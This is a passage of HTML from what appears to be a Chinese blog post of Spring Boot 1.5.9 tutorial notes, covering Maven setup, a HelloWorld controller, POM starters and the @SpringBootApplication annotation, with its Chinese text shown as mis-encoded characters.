href="#7-crud-%E5%91%98%E5%B7%A5%E4%BF%AE%E6%94%B9">7ï¼‰ã€CRUD-å‘˜å·¥ä¿®æ”¹</a></li><li><a href="#8-crud-%E5%91%98%E5%B7%A5%E5%88%A0%E9%99%A4">8ï¼‰ã€CRUD-å‘˜å·¥åˆ é™¤</a></li></ul></li><li><a href="#7-%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6">7ã€é”™è¯¯å¤„ç†æœºåˆ¶</a><ul><li><a href="#1-springboot%E9%BB%98%E8%AE%A4%E7%9A%84%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6">1ï¼‰ã€SpringBooté»˜è®¤çš„é”™è¯¯å¤„ç†æœºåˆ¶</a></li><li><a href="#2-%E5%A6%82%E6%9E%9C%E5%AE%9A%E5%88%B6%E9%94%99%E8%AF%AF%E5%93%8D%E5%BA%94">2ï¼‰ã€å¦‚æœå®šåˆ¶é”™è¯¯å“åº”ï¼š</a><ul><li><a href="#1-%E5%A6%82%E4%BD%95%E5%AE%9A%E5%88%B6%E9%94%99%E8%AF%AF%E7%9A%84%E9%A1%B5%E9%9D%A2"><strong>1ï¼‰ã€å¦‚ä½•å®šåˆ¶é”™è¯¯çš„é¡µé¢ï¼›</strong></a></li><li><a href="#2-%E5%A6%82%E4%BD%95%E5%AE%9A%E5%88%B6%E9%94%99%E8%AF%AF%E7%9A%84json%E6%95%B0%E6%8D%AE">2ï¼‰ã€å¦‚ä½•å®šåˆ¶é”™è¯¯çš„jsonæ•°æ®ï¼›</a></li><li><a href="#3-%E5%B0%86%E6%88%91%E4%BB%AC%E7%9A%84%E5%AE%9A%E5%88%B6%E6%95%B0%E6%8D%AE%E6%90%BA%E5%B8%A6%E5%87%BA%E5%8E%BB">3ï¼‰ã€å°†æˆ‘ä»¬çš„å®šåˆ¶æ•°æ®æºå¸¦å‡ºå»ï¼›</a></li></ul></li></ul></li><li><a href="#8-%E9%85%8D%E7%BD%AE%E5%B5%8C%E5%85%A5%E5%BC%8Fservlet%E5%AE%B9%E5%99%A8">8ã€é…ç½®åµŒå…¥å¼Servletå®¹å™¨</a><ul><li><a href="#1-%E5%A6%82%E4%BD%95%E5%AE%9A%E5%88%B6%E5%92%8C%E4%BF%AE%E6%94%B9servlet%E5%AE%B9%E5%99%A8%E7%9A%84%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE">1ï¼‰ã€å¦‚ä½•å®šåˆ¶å’Œä¿®æ”¹Servletå®¹å™¨çš„ç›¸å…³é…ç½®ï¼›</a></li><li><a href="#2-%E6%B3%A8%E5%86%8Cservlet%E4%B8%89%E5%A4%A7%E7%BB%84%E4%BB%B6servlet-filter-listener">2ï¼‰ã€æ³¨å†ŒServletä¸‰å¤§ç»„ä»¶ã€Servletã€Filterã€Listenerã€‘</a></li><li><a href="#3-%E6%9B%BF%E6%8D%A2%E4%B8%BA%E5%85%B6%E4%BB%96%E5%B5%8C%E5%85%A5%E5%BC%8Fservlet%E5%AE%B9%E5%99%A8">3ï¼‰ã€æ›¿æ¢ä¸ºå…¶ä»–åµŒå…¥å¼Servletå®¹å™¨</a></li><li><a href="#4-%E5%B5%8C%E5%85%A5%E5%BC%8Fservlet%E5%AE%B9%E5%99%A8%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86">4ï¼‰ã€åµŒå…¥å¼Servletå®¹å™¨è‡ªåŠ¨é…ç½®åŸç†ï¼›</a></li></ul></li><li><a href="#9-%E4%BD%BF%E7%94%A8%E5%A4%96%E7%BD%AE%E7%9A%84servlet%E5%AE%B9%E5%99%A8">9ã€ä½¿ç”¨å¤–ç½®çš„Servletå®¹å™¨</a><ul><li><a href="#%E6%AD%A5%E9%AA%A4">æ­¥éª¤</a></li><li><a href="#%E5%8E%9F%E7%90%86">åŸç†</a></li></ul></li></ul></li><li><a href="#%E4%BA%94-docker">äº”ã€Docker</a><ul><li><a href="#1-%E7%AE%80%E4%BB%8B-1">1ã€ç®€ä»‹</a></li><li><a href="#2-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5">2ã€æ ¸å¿ƒæ¦‚å¿µ</a></li><li><a href="#3-%E5%AE%89%E8%A3%85docker">3ã€å®‰è£…Docker</a><ul><li><a href="#1-%E5%AE%89%E8%A3%85linux%E8%99%9A%E6%8B%9F%E6%9C%BA">1ï¼‰ã€å®‰è£…linuxè™šæ‹Ÿæœº</a></li><li><a href="#2-%E5%9C%A8linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8A%E5%AE%89%E8%A3%85docker">2ï¼‰ã€åœ¨linuxè™šæ‹Ÿæœºä¸Šå®‰è£…docker</a></li></ul></li><li><a href="#4-docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%93%8D%E4%BD%9C">4ã€Dockerå¸¸ç”¨å‘½ä»¤&amp;æ“ä½œ</a><ul><li><a href="#1-%E9%95%9C%E5%83%8F%E6%93%8D%E4%BD%9C">1ï¼‰ã€é•œåƒæ“ä½œ</a></li><li><a href="#2-%E5%AE%B9%E5%99%A8%E6%93%8D%E4%BD%9C">2ï¼‰ã€å®¹å™¨æ“ä½œ</a></li><li><a href="#3-%E5%AE%89%E8%A3%85mysql%E7%A4%BA%E4%BE%8B">3ï¼‰ã€å®‰è£…MySQLç¤ºä¾‹</a></li></ul></li></ul></li><li><a href="#%E5%85%AD-springboot%E4%B8%8E%E6%95%B0%E6%8D%AE%E8%AE%BF%E9%97%AE">å…­ã€SpringBootä¸æ•°æ®è®¿é—®</a><ul><li><a href="#1-jdbc">1ã€JDBC</a></li><li><a href="#2-%E6%95%B4%E5%90%88druid%E6%95%B0%E6%8D%AE%E6%BA%90">2ã€æ•´åˆDruidæ•°æ®æº</a></li><li><a href="#3-%E6%95%B4%E5%90%88mybatis">3ã€æ•´åˆMyBatis</a><ul><li><a href="#4-%E6%B3%A8%E8%A7%A3%E7%89%88">4ï¼‰ã€æ³¨è§£ç‰ˆ</a></li><li><a href="#5-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%89%88">5ï¼‰ã€é…ç½®æ–‡ä»¶ç‰ˆ</a></li></ul></li><li><a href="#4-%E6%95%B4%E5%90%88springdata-jpa">4ã€æ•´åˆSpringData JPA</a><ul><li><a href="#1-springdata%E7%AE%80%E4%BB%8B">1ï¼‰ã€SpringDataç®€ä»‹</a></li><li><a href="#2-%E6%95%B4%E5%90%88springdata-jpa">2ï¼‰ã€æ•´åˆSpringData JPA</a></li></ul></li></ul></li><li><a href="#%E4%B8%83-%E5%90%AF%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86">ä¸ƒã€å¯åŠ¨é…ç½®åŸç†</a><ul><li><a href="#1-%E5%88%9B%E5%BB%BAspringapplication%E5%AF%B9%E8%B1%A1"><strong>1ã€åˆ›å»ºSpringApplicationå¯¹è±¡</strong></a></li><li><a href="#2-%E8%BF%90%E8%A1%8Crun%E6%96%B9%E6%B3%95">2ã€è¿è¡Œrunæ–¹æ³•</a></li><li><a href="#3-%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC%E6%9C%BA%E5%88%B6">3ã€äº‹ä»¶ç›‘å¬æœºåˆ¶</a></li></ul></li><li><a href="#%E5%85%AB-%E8%87%AA%E5%AE%9A%E4%B9%89starter">å…«ã€è‡ªå®šä¹‰starter</a></li><li><a href="#%E6%9B%B4%E5%A4%9Aspringboot%E6%95%B4%E5%90%88%E7%A4%BA%E4%BE%8B">æ›´å¤šSpringBootæ•´åˆç¤ºä¾‹</a></li></ul><!-- tocstop --><h1><span id="ä¸€-spring-boot-å…¥é—¨"><strong>ä¸€ã€</strong>Spring Boot å…¥é—¨</span></h1><h2><span id="1-spring-boot-ç®€ä»‹">1ã€Spring Boot ç®€ä»‹</span></h2><blockquote><p>ç®€åŒ–Springåº”ç”¨å¼€å‘çš„ä¸€ä¸ªæ¡†æ¶ï¼›</p><p>æ•´ä¸ªSpringæŠ€æœ¯æ ˆçš„ä¸€ä¸ªå¤§æ•´åˆï¼›</p><p>J2EEå¼€å‘çš„ä¸€ç«™å¼è§£å†³æ–¹æ¡ˆï¼›</p></blockquote><h2><span id="2-å¾®æœåŠ¡">2ã€å¾®æœåŠ¡</span></h2><p>2014ï¼Œmartin fowler</p><p>å¾®æœåŠ¡ï¼šæ¶æ„é£æ ¼ï¼ˆæœåŠ¡å¾®åŒ–ï¼‰</p><p>ä¸€ä¸ªåº”ç”¨åº”è¯¥æ˜¯ä¸€ç»„å°å‹æœåŠ¡ï¼›å¯ä»¥é€šè¿‡HTTPçš„æ–¹å¼è¿›è¡Œäº’é€šï¼›</p><p>å•ä½“åº”ç”¨ï¼šALL IN ONE</p><p>å¾®æœåŠ¡ï¼šæ¯ä¸€ä¸ªåŠŸèƒ½å…ƒç´ æœ€ç»ˆéƒ½æ˜¯ä¸€ä¸ªå¯ç‹¬ç«‹æ›¿æ¢å’Œç‹¬ç«‹å‡çº§çš„è½¯ä»¶å•å…ƒï¼›</p><p><a href="https://martinfowler.com/articles/microservices.html#MicroservicesAndSoa">è¯¦ç»†å‚ç…§å¾®æœåŠ¡æ–‡æ¡£</a></p><h2><span id="3-ç¯å¢ƒå‡†å¤‡">3ã€ç¯å¢ƒå‡†å¤‡</span></h2><p><a href="http://www.gulixueyuan.com/">http://www.gulixueyuan.com/</a> è°·ç²’å­¦é™¢</p><p>ç¯å¢ƒçº¦æŸ</p><p>â€“jdk1.8ï¼šSpring Boot æ¨èjdk1.7åŠä»¥ä¸Šï¼›java version â€œ1.8.0_112â€</p><p>â€“maven3.xï¼šmaven 3.3ä»¥ä¸Šç‰ˆæœ¬ï¼›Apache Maven 3.3.9</p><p>â€“IntelliJIDEA2017ï¼šIntelliJ IDEA 2017.2.2 x64ã€STS</p><p>â€“SpringBoot 1.5.9.RELEASEï¼š1.5.9ï¼›</p><p>ç»Ÿä¸€ç¯å¢ƒï¼›</p><h3><span id="1-mavenè®¾ç½®">1ã€MAVENè®¾ç½®ï¼›</span></h3><p>ç»™maven çš„settings.xmlé…ç½®æ–‡ä»¶çš„profilesæ ‡ç­¾æ·»åŠ </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="2-ideaè®¾ç½®">2ã€IDEAè®¾ç½®</span></h3><p>æ•´åˆmavenè¿›æ¥ï¼›</p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180129151045.png" alt="ideaè®¾ç½®"></p><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180129151112.png" alt="images/"></p><h2><span id="4-spring-boot-helloworld">4ã€Spring Boot HelloWorld</span></h2><p>ä¸€ä¸ªåŠŸèƒ½ï¼š</p><p>æµè§ˆå™¨å‘é€helloè¯·æ±‚ï¼ŒæœåŠ¡å™¨æ¥å—è¯·æ±‚å¹¶å¤„ç†ï¼Œå“åº”Hello Worldå­—ç¬¦ä¸²ï¼›</p><h3><span id="1-åˆ›å»ºä¸€ä¸ªmavenå·¥ç¨‹jar">1ã€åˆ›å»ºä¸€ä¸ªmavenå·¥ç¨‹ï¼›ï¼ˆjarï¼‰</span></h3><h3><span id="2-å¯¼å…¥spring-bootç›¸å…³çš„ä¾èµ–">2ã€å¯¼å…¥spring bootç›¸å…³çš„ä¾èµ–</span></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="3-ç¼–å†™ä¸€ä¸ªä¸»ç¨‹åºå¯åŠ¨spring-bootåº”ç”¨">3ã€ç¼–å†™ä¸€ä¸ªä¸»ç¨‹åºï¼›å¯åŠ¨Spring Bootåº”ç”¨</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@SpringBootApplication</span> æ¥æ ‡æ³¨ä¸€ä¸ªä¸»ç¨‹åºç±»ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªSpring Bootåº”ç”¨</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorldMainApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Springåº”ç”¨å¯åŠ¨èµ·æ¥</span></span><br><span class="line">        SpringApplication.run(HelloWorldMainApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="4-ç¼–å†™ç›¸å…³çš„controller-service">4ã€ç¼–å†™ç›¸å…³çš„Controllerã€Service</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="5-è¿è¡Œä¸»ç¨‹åºæµ‹è¯•">5ã€è¿è¡Œä¸»ç¨‹åºæµ‹è¯•</span></h3><h3><span id="6-ç®€åŒ–éƒ¨ç½²">6ã€ç®€åŒ–éƒ¨ç½²</span></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- è¿™ä¸ªæ’ä»¶ï¼Œå¯ä»¥å°†åº”ç”¨æ‰“åŒ…æˆä¸€ä¸ªå¯æ‰§è¡Œçš„jaråŒ…ï¼›--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å°†è¿™ä¸ªåº”ç”¨æ‰“æˆjaråŒ…ï¼Œç›´æ¥ä½¿ç”¨java -jarçš„å‘½ä»¤è¿›è¡Œæ‰§è¡Œï¼›</p><h2><span id="5-hello-worldæ¢ç©¶">5ã€Hello Worldæ¢ç©¶</span></h2><h3><span id="1-pomæ–‡ä»¶">1ã€POMæ–‡ä»¶</span></h3><h4><span id="1-çˆ¶é¡¹ç›®">1ã€çˆ¶é¡¹ç›®</span></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">ä»–çš„çˆ¶é¡¹ç›®æ˜¯</span><br><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">relativePath</span>&gt;</span>../../spring-boot-dependencies<span class="tag">&lt;/<span class="name">relativePath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">ä»–æ¥çœŸæ­£ç®¡ç†Spring Bootåº”ç”¨é‡Œé¢çš„æ‰€æœ‰ä¾èµ–ç‰ˆæœ¬ï¼›</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Spring Bootçš„ç‰ˆæœ¬ä»²è£ä¸­å¿ƒï¼›</p><p>ä»¥åæˆ‘ä»¬å¯¼å…¥ä¾èµ–é»˜è®¤æ˜¯ä¸éœ€è¦å†™ç‰ˆæœ¬ï¼›ï¼ˆæ²¡æœ‰åœ¨dependenciesé‡Œé¢ç®¡ç†çš„ä¾èµ–è‡ªç„¶éœ€è¦å£°æ˜ç‰ˆæœ¬å·ï¼‰</p><h4><span id="2-å¯åŠ¨å™¨">2ã€å¯åŠ¨å™¨</span></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>spring-boot-starter</strong>-&#x3D;&#x3D;web&#x3D;&#x3D;ï¼š</p><p>â€‹spring-boot-starterï¼šspring-bootåœºæ™¯å¯åŠ¨å™¨ï¼›å¸®æˆ‘ä»¬å¯¼å…¥äº†webæ¨¡å—æ­£å¸¸è¿è¡Œæ‰€ä¾èµ–çš„ç»„ä»¶ï¼›</p><p>Spring Bootå°†æ‰€æœ‰çš„åŠŸèƒ½åœºæ™¯éƒ½æŠ½å–å‡ºæ¥ï¼Œåšæˆä¸€ä¸ªä¸ªçš„startersï¼ˆå¯åŠ¨å™¨ï¼‰ï¼Œåªéœ€è¦åœ¨é¡¹ç›®é‡Œé¢å¼•å…¥è¿™äº›starterç›¸å…³åœºæ™¯çš„æ‰€æœ‰ä¾èµ–éƒ½ä¼šå¯¼å…¥è¿›æ¥ã€‚è¦ç”¨ä»€ä¹ˆåŠŸèƒ½å°±å¯¼å…¥ä»€ä¹ˆåœºæ™¯çš„å¯åŠ¨å™¨</p><h3><span id="2-ä¸»ç¨‹åºç±»ä¸»å…¥å£ç±»">2ã€ä¸»ç¨‹åºç±»ï¼Œä¸»å…¥å£ç±»</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@SpringBootApplication</span> æ¥æ ‡æ³¨ä¸€ä¸ªä¸»ç¨‹åºç±»ï¼Œè¯´æ˜è¿™æ˜¯ä¸€ä¸ªSpring Bootåº”ç”¨</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorldMainApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Springåº”ç”¨å¯åŠ¨èµ·æ¥</span></span><br><span class="line">        SpringApplication.run(HelloWorldMainApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>@<strong>SpringBootApplication</strong>:    Spring Bootåº”ç”¨æ ‡æ³¨åœ¨æŸä¸ªç±»ä¸Šè¯´æ˜è¿™ä¸ªç±»æ˜¯SpringBootçš„ä¸»é…ç½®ç±»ï¼ŒSpringBootå°±åº”è¯¥è¿è¡Œè¿™ä¸ªç±»çš„mainæ–¹æ³•æ¥å¯åŠ¨SpringBootåº”ç”¨ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="meta">@SpringBootConfiguration</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br><span class="line"><span class="meta">@ComponentScan(excludeFilters = &#123;</span></span><br><span class="line"><span class="meta">      @Filter(type = FilterType.CUSTOM, classes = TypeExcludeFilter.class),</span></span><br><span class="line"><span class="meta">      @Filter(type = FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter.class) &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> SpringBootApplication &#123;</span><br></pre></td></tr></table></figure><p>@<strong>SpringBootConfiguration</strong>:Spring Bootçš„é…ç½®ç±»ï¼›</p><p>â€‹æ ‡æ³¨åœ¨æŸä¸ªç±»ä¸Šï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªSpring Bootçš„é…ç½®ç±»ï¼›</p><p>â€‹@<strong>Configuration</strong>:é…ç½®ç±»ä¸Šæ¥æ ‡æ³¨è¿™ä¸ªæ³¨è§£ï¼›</p><p>â€‹é…ç½®ç±» â€”â€“  é…ç½®æ–‡ä»¶ï¼›é…ç½®ç±»ä¹Ÿæ˜¯å®¹å™¨ä¸­çš„ä¸€ä¸ªç»„ä»¶ï¼›@Component</p><p>@<strong>EnableAutoConfiguration</strong>ï¼šå¼€å¯è‡ªåŠ¨é…ç½®åŠŸèƒ½ï¼›</p><p>â€‹ä»¥å‰æˆ‘ä»¬éœ€è¦é…ç½®çš„ä¸œè¥¿ï¼ŒSpring Bootå¸®æˆ‘ä»¬è‡ªåŠ¨é…ç½®ï¼›@<strong>EnableAutoConfiguration</strong>å‘Šè¯‰SpringBootå¼€å¯è‡ªåŠ¨é…ç½®åŠŸèƒ½ï¼›è¿™æ ·è‡ªåŠ¨é…ç½®æ‰èƒ½ç”Ÿæ•ˆï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AutoConfigurationPackage</span></span><br><span class="line"><span class="meta">@Import(EnableAutoConfigurationImportSelector.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableAutoConfiguration &#123;</span><br></pre></td></tr></table></figure><p>â€‹      @<strong>AutoConfigurationPackage</strong>ï¼šè‡ªåŠ¨é…ç½®åŒ…</p><p>â€‹@<strong>Import</strong>(AutoConfigurationPackages.Registrar.class)ï¼š</p><p>â€‹Springçš„åº•å±‚æ³¨è§£@Importï¼Œç»™å®¹å™¨ä¸­å¯¼å…¥ä¸€ä¸ªç»„ä»¶ï¼›å¯¼å…¥çš„ç»„ä»¶ç”±AutoConfigurationPackages.Registrar.classï¼›</p><p>&#x3D;&#x3D;å°†ä¸»é…ç½®ç±»ï¼ˆ@SpringBootApplicationæ 